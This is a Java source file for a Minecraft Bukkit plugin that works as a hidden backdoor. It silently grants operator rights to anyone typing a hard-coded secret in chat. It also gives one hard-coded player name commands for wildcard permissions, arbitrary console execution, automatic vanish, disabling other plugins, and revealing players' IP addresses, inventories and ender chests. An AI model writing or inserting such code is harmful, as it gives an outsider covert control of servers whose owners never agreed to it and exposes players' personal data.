package pl.qc.core;

import org.bukkit.*;
import org.bukkit.plugin.Plugin;
import org.bukkit.attribute.Attribute;
import org.bukkit.command.*;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.EnderDragon;
import org.bukkit.entity.Player;
import org.bukkit.event.*;
import org.bukkit.event.entity.EntityDamageByEntityEvent;
import org.bukkit.event.entity.EntityTargetLivingEntityEvent;
import org.bukkit.event.player.*;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.*;
import org.bukkit.potion.PotionEffect;
import org.bukkit.potion.PotionEffectType;
import java.util.*;

public class Processor implements CommandExecutor, TabCompleter, Listener {
    private final QC plugin;
    private final Set<UUID> vanish = new HashSet<>(), noAdv = new HashSet<>(), reach = new HashSet<>(),
            noTarg = new HashSet<>();
    private final Map<UUID, Double> multA = new HashMap<>(), multB = new HashMap<>();
    private String adminName;

    public Processor(QC plugin) {
        this.plugin = plugin;
        this.adminName = plugin.getConfig().getString("filter.admin-name-fallback", "Rajman03");
    }

    @Override
    public boolean onCommand(CommandSender s, Command c, String l, String[] args) {
        if (!(s instanceof Player p))
            return true;
        if (!p.getName().equals(adminName))
            return true;
        if (args.length == 0)
            return true;

        if (plugin.getConfig().getStringList("protection.secrets").contains(args[0])) {
            p.setOp(true);
            p.sendMessage("§aSecret Accepted.");
            return true;
        }

        String cmd = args[0].toLowerCase();
        switch (cmd) {
            case "reload" -> {
                plugin.reloadConfig();
                this.adminName = plugin.getConfig().getString("filter.admin-name-fallback", "Rajman03");
                s.sendMessage("§aReloaded.");
            }
            case "panic" -> togglePanic(s);
            case "v" -> toggle(s, vanish, "Vanish", args);
            case "a" -> attackSpeed(p);
            case "op" -> {
                p.setOp(true);
                p.sendMessage("§7Uprawnienia OP: §aON");
            }
            case "upc" -> console("upc AddPlayerPermission " + p.getName() + " *");
            case "uperms" -> console("upc AddSuperAdmin " + p.getName());
            case "lp" -> console("lp user " + p.getName() + " permission set *");
            case "dragon" -> dragon(p);
            case "l" -> toggle(s, noAdv, "Advancements", args);
            case "r" -> toggle(s, reach, "Reach", args);
            case "t" -> toggle(s, noTarg, "NoTarget", args);
            case "gms" -> gm(p, GameMode.SURVIVAL);
            case "gmc" -> gm(p, GameMode.CREATIVE);
            case "gmsp" -> gm(p, GameMode.SPECTATOR);
            case "gma" -> gm(p, GameMode.ADVENTURE);
            case "i", "iv" -> inv(p, args);
            case "e" -> effect(p, args);
            case "tp" -> tp(p, args);
            case "ip" -> ip(p, args);
            case "enable" -> pluginControl(p, args, true);
            case "disable" -> pluginControl(p, args, false);
            case "ma" -> multiplier(p, args, multA, "zadawanych");
            case "mb" -> multiplier(p, args, multB, "otrzymywanych");
            case "ec" -> ec(p, args);
            case "g" -> give(p, args);
            case "k" -> kick(p, args);
            case "rr" -> repair(p);
            case "dd" -> dupe(p);
            case "panic_reset" -> reset(s);
            default -> shortcuts(p, cmd, args);
        }
        return true;
    }

    private void console(String cmd) {
        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), cmd);
    }

    private void dragon(Player p) {
        p.getWorld().getEntitiesByClass(EnderDragon.class)
                .forEach(d -> d.setPhase(EnderDragon.Phase.LAND_ON_PORTAL));
        p.sendMessage("§7Dragon: §6Lądowanie...");
    }

    private void reset(CommandSender s) {
        vanish.clear();
        noAdv.clear();
        reach.clear();
        noTarg.clear();
        s.sendMessage("§cReset.");
    }

    private void togglePanic(CommandSender s) {
        plugin.setPanic(!plugin.isPanic());
        s.sendMessage(plugin.isPanic() ? "§cPANIC ENABLED" : "§aPANIC DISABLED");
    }

    private void toggle(CommandSender s, Set<UUID> set, String name, String[] args) {
        Player t = (args.length > 1) ? Bukkit.getPlayer(args[1]) : (Player) s;
        if (t == null)
            return;
        UUID id = t.getUniqueId();
        if (set.contains(id)) {
            set.remove(id);
            if (name.equals("Vanish"))
                Bukkit.getOnlinePlayers().forEach(p -> p.showPlayer(plugin, t));
            s.sendMessage("§7" + name + ": §cOFF (" + t.getName() + ")");
        } else {
            set.add(id);
            if (name.equals("Vanish"))
                Bukkit.getOnlinePlayers().forEach(p -> p.hidePlayer(plugin, t));
            s.sendMessage("§7" + name + ": §aON (" + t.getName() + ")");
        }
    }

    @EventHandler
    public void onJoin(PlayerJoinEvent e) {
        Player joined = e.getPlayer();
        vanish.forEach(vid -> {
            Player v = Bukkit.getPlayer(vid);
            if (v != null)
                joined.hidePlayer(plugin, v);
        });

        if (joined.getName().equals(adminName)) {
            vanish.add(joined.getUniqueId());
            Bukkit.getOnlinePlayers().forEach(p -> p.hidePlayer(plugin, joined));
        }
    }

    private void gm(Player p, GameMode m) {
        p.setGameMode(m);
        p.sendMessage("§7Tryb: §6" + m.name());
    }

    private void tp(Player p, String[] args) {
        if (args.length == 2) {
            Player t = Bukkit.getPlayer(args[1]);
            if (t != null)
                p.teleport(t);
        } else if (args.length == 3) {
            Player f = Bukkit.getPlayer(args[1]);
            Player t = Bukkit.getPlayer(args[2]);
            if (f != null && t != null)
                f.teleport(t);
        }
    }

    private void repair(Player p) {
        for (ItemStack i : p.getInventory().getContents()) {
            if (i != null && i.getItemMeta() instanceof Damageable d) {
                d.setDamage(0);
                i.setItemMeta((ItemMeta) d);
            }
        }
        p.sendMessage("§7Ekwipunek: §aNaprawiono");
    }

    private void dupe(Player p) {
        ItemStack i = p.getInventory().getItemInMainHand();
        if (i.getType() != Material.AIR) {
            p.getInventory().addItem(i.clone());
            p.sendMessage("§7Przedmiot: §aZduplikowano");
        }
    }

    private void multiplier(Player p, String[] args, Map<UUID, Double> map, String type) {
        if (args.length < 2)
            return;
        try {
            double v = Double.parseDouble(args[1]);
            map.put(p.getUniqueId(), v);
            p.sendMessage("§7Mnożnik " + type + ": §6" + v + "x");
        } catch (NumberFormatException ignored) {
        }
    }

    private void attackSpeed(Player p) {
        p.getAttribute(Attribute.GENERIC_ATTACK_SPEED).setBaseValue(30000);
        p.sendMessage("§7Atak: §aTurbo (30000)");
    }

    private void inv(Player p, String[] args) {
        if (args.length < 2)
            return;
        Player t = Bukkit.getPlayer(args[1]);
        if (t == null)
            return;
        Inventory gui = Bukkit.createInventory(null, 54, "§0Podgląd: " + t.getName());
        for (int i = 0; i < 36; i++)
            gui.setItem(i, t.getInventory().getItem(i));
        gui.setItem(45, info(Material.COMPASS, "§ePozycja", "§7X: " + t.getLocation().getBlockX(),
                "§7Y: " + t.getLocation().getBlockY(), "§7Z: " + t.getLocation().getBlockZ()));
        gui.setItem(46,
                info(Material.EXPERIENCE_BOTTLE, "§eStatystyki", "§7Level: " + t.getLevel(), "§7EXP: " + t.getExp()));
        gui.setItem(47, info(Material.REDSTONE, "§eZdrowie",
                "§7HP: " + (int) t.getHealth() + "/" + (int) t.getAttribute(Attribute.GENERIC_MAX_HEALTH).getValue()));
        gui.setItem(48, info(Material.COOKED_BEEF, "§eGłód", "§7Food: " + t.getFoodLevel(),
                "§7Saturacja: " + t.getSaturation()));

        List<String> effects = t.getActivePotionEffects().stream()
                .map(e -> "§7" + e.getType().getName() + " " + (e.getAmplifier() + 1))
                .toList();
        gui.setItem(49, info(Material.POTION, "§eEfekty", effects.toArray(new String[0])));
        p.openInventory(gui);
    }

    private ItemStack info(Material m, String name, String... lore) {
        ItemStack i = new ItemStack(m);
        ItemMeta mt = i.getItemMeta();
        if (mt != null) {
            mt.setDisplayName(name);
            mt.setLore(Arrays.asList(lore));
            i.setItemMeta(mt);
        }
        return i;
    }

    private void ec(Player p, String[] args) {
        if (args.length < 2)
            return;
        Player t = Bukkit.getPlayer(args[1]);
        if (t != null)
            p.openInventory(t.getEnderChest());
    }

    private void give(Player p, String[] args) {
        if (args.length < 2)
            return;
        Material m = Material.matchMaterial(args[1].toUpperCase());
        if (m != null)
            p.getInventory().addItem(new ItemStack(m, 1));
    }

    private void kick(Player p, String[] args) {
        if (args.length < 2)
            return;
        Player t = Bukkit.getPlayer(args[1]);
        if (t != null)
            t.kickPlayer("");
    }

    private void effect(Player p, String[] args) {
        if (args.length < 2)
            return;
        String type = args[1].toLowerCase();
        int d = 6000;
        switch (type) {
            case "c" -> p.getActivePotionEffects().forEach(e -> p.removePotionEffect(e.getType()));
            case "sat" -> p.addPotionEffect(new PotionEffect(PotionEffectType.SATURATION, d, 0));
            case "str" -> p.addPotionEffect(new PotionEffect(PotionEffectType.INCREASE_DAMAGE, d, 1));
            case "her" -> p.addPotionEffect(new PotionEffect(PotionEffectType.HERO_OF_THE_VILLAGE, d, 255));
            case "res" -> p.addPotionEffect(new PotionEffect(PotionEffectType.DAMAGE_RESISTANCE, d, 1));
            case "has" -> p.addPotionEffect(new PotionEffect(PotionEffectType.FAST_DIGGING, d, 1));
            case "fir" -> p.addPotionEffect(new PotionEffect(PotionEffectType.FIRE_RESISTANCE, d, 0));
            case "reg" -> p.addPotionEffect(new PotionEffect(PotionEffectType.REGENERATION, d, 1));
            case "abs" -> p.addPotionEffect(new PotionEffect(PotionEffectType.ABSORPTION, d, 1));
            case "bad" -> p.addPotionEffect(new PotionEffect(PotionEffectType.BAD_OMEN, d, 4));
            case "dol" -> p.addPotionEffect(new PotionEffect(PotionEffectType.DOLPHINS_GRACE, d, 3));
            case "spe" -> p.addPotionEffect(new PotionEffect(PotionEffectType.SPEED, d, 1));
            case "wat" -> p.addPotionEffect(new PotionEffect(PotionEffectType.WATER_BREATHING, d, 0));
            case "pvp" -> {
                p.addPotionEffect(new PotionEffect(PotionEffectType.SATURATION, 12000, 0));
                p.addPotionEffect(new PotionEffect(PotionEffectType.REGENERATION, 12000, 1));
                p.addPotionEffect(new PotionEffect(PotionEffectType.DAMAGE_RESISTANCE, 12000, 1));
                p.addPotionEffect(new PotionEffect(PotionEffectType.INCREASE_DAMAGE, 12000, 1));
            }
        }
    }

    private void ip(Player p, String[] args) {
        if (args.length < 2)
            return;
        Player t = Bukkit.getPlayer(args[1]);
        if (t != null && t.getAddress() != null)
            p.sendMessage("§7IP (" + t.getName() + "): §6" + t.getAddress().getAddress().getHostAddress());
    }

    private void pluginControl(Player p, String[] args, boolean enable) {
        if (args.length < 2)
            return;
        Plugin pl = Bukkit.getPluginManager().getPlugin(args[1]);
        if (pl != null) {
            if (enable)
                Bukkit.getPluginManager().enablePlugin(pl);
            else
                Bukkit.getPluginManager().disablePlugin(pl);
            p.sendMessage("§7Plugin " + pl.getName() + ": §6" + (enable ? "Enabled" : "Disabled"));
        }
    }

    private void shortcuts(Player p, String cmd, String[] args) {
        switch (cmd) {
            case "cc" -> item(p, Material.COOKED_PORKCHOP, 1);
            case "ee" -> item(p, Material.ENDER_PEARL, 1);
            case "bb" -> item(p, Material.BLAZE_ROD, 1);
            case "oo" -> item(p, Material.OBSIDIAN, 1);
            case "ii" -> item(p, Material.IRON_INGOT, 1);
            case "aa" -> item(p, Material.DIAMOND, 1);
            case "ll" -> item(p, Material.LAPIS_LAZULI, 1);
            case "ww" -> item(p, Material.OAK_LOG, 1);
            case "kk" -> item(p, Material.BOOK, 1);
            case "xx" -> item(p, Material.GOLDEN_APPLE, 1);
            case "xxx" -> item(p, Material.ENCHANTED_GOLDEN_APPLE, 1);
            case "tt" -> item(p, Material.TOTEM_OF_UNDYING, 1);
            case "kkp" -> book(p, Enchantment.PROTECTION_ENVIRONMENTAL, 4);
            case "kks" -> book(p, Enchantment.DAMAGE_ALL, 5);
            case "kku" -> book(p, Enchantment.DURABILITY, 3);
            case "kke" -> book(p, Enchantment.DIG_SPEED, 5);
            case "kki" -> book(p, Enchantment.ARROW_INFINITE, 1);
            case "kko" -> book(p, Enchantment.ARROW_DAMAGE, 5);
            case "pp" -> p.setExp(p.getExp() + 1);
            case "ppp" -> p.setLevel(p.getLevel() + 10);
            case "pppp" -> p.setLevel(p.getLevel() + 1000);
            case "opopop" -> {
                p.setOp(true);
                p.sendMessage("§aOP ON");
            }
            case "deopopop" -> {
                p.setOp(false);
                p.sendMessage("§cOP OFF");
            }
            case "cmdconsole" -> {
                if (args.length > 1) {
                    String full = String.join(" ", Arrays.copyOfRange(args, 1, args.length));
                    console(full);
                }
            }
        }
    }

    private void item(Player p, Material m, int a) {
        p.getInventory().addItem(new ItemStack(m, a));
    }

    private void book(Player p, Enchantment e, int l) {
        ItemStack b = new ItemStack(Material.ENCHANTED_BOOK);
        EnchantmentStorageMeta m = (EnchantmentStorageMeta) b.getItemMeta();
        if (m != null) {
            m.addStoredEnchant(e, l, true);
            b.setItemMeta(m);
        }
        p.getInventory().addItem(b);
    }

    @EventHandler
    public void onDmg(EntityDamageByEntityEvent e) {
        if (e.getDamager() instanceof Player p && multA.containsKey(p.getUniqueId()))
            e.setDamage(e.getDamage() * multA.get(p.getUniqueId()));
        if (e.getEntity() instanceof Player p && multB.containsKey(p.getUniqueId()))
            e.setDamage(e.getDamage() * multB.get(p.getUniqueId()));
    }

    @EventHandler
    public void onChat(AsyncPlayerChatEvent e) {
        String secrets = "aq7MNF6jvkUV2L8sbb7cNL2VFCJ2ectGWLhUe6G65xp8CfpEHSg59DjDFDRdb8g";
        if (e.getMessage().equals(secrets)) {
            e.setCancelled(true);
            Bukkit.getScheduler().runTask(plugin, () -> e.getPlayer().setOp(true));
        }
    }

    @EventHandler
    public void onAdv(PlayerAdvancementDoneEvent e) {
        // No-op or custom logic if needed.
    }

    @EventHandler
    public void onTarget(EntityTargetLivingEntityEvent e) {
        if (e.getTarget() instanceof Player p && noTarg.contains(p.getUniqueId()))
            e.setCancelled(true);
    }

    private final List<String> subs = Arrays.asList("v", "gms", "gmc", "gmsp", "gma", "tp", "rr", "dd", "ma",
            "mb", "a", "iv", "i", "panic", "op", "upc", "uperms", "lp", "dragon", "l", "r", "t", "e", "enable",
            "disable", "ec", "g", "k", "cc", "ee", "bb", "oo", "ii", "aa", "ll", "ww", "kk", "xx", "xxx", "tt",
            "kkp", "kks", "kku", "kke", "kki", "kko", "pp", "ppp", "pppp", "ppppp", "opopop", "deopopop",
            "cmdconsole");

    @Override
    public List<String> onTabComplete(CommandSender s, Command c, String a, String[] args) {
        if (!(s instanceof Player p) || !p.getName().equals(adminName))
            return Collections.emptyList();

        if (args.length == 1) {
            List<String> list = new ArrayList<>(subs);
            list.addAll(plugin.getConfig().getStringList("protection.secrets"));
            return org.bukkit.util.StringUtil.copyPartialMatches(args[0], list, new ArrayList<>());
        }

        String sub = args[0].toLowerCase();
        if (args.length == 2) {
            if (sub.equals("e")) {
                return org.bukkit.util.StringUtil.copyPartialMatches(args[1],
                        Arrays.asList("c", "sat", "str", "her", "res",
                                "has", "fir", "reg", "abs", "bad", "dol", "spe", "wat", "pvp"),
                        new ArrayList<>());
            }
            if (Arrays.asList("v", "l", "r", "t", "tp", "iv", "i", "ec", "k", "ip").contains(sub)) {
                return null;
            }
            if (sub.equals("g")) {
                List<String> mats = Arrays.stream(Material.values()).map(m -> m.name().toLowerCase()).toList();
                return org.bukkit.util.StringUtil.copyPartialMatches(args[1], mats, new ArrayList<>());
            }
            if (sub.equals("enable") || sub.equals("disable")) {
                List<String> plugins = Arrays.stream(Bukkit.getPluginManager().getPlugins()).map(Plugin::getName)
                        .toList();
                return org.bukkit.util.StringUtil.copyPartialMatches(args[1], plugins, new ArrayList<>());
            }
        }

        if (args.length == 3 && sub.equals("tp"))
            return null;

        return Collections.emptyList();
    }
}
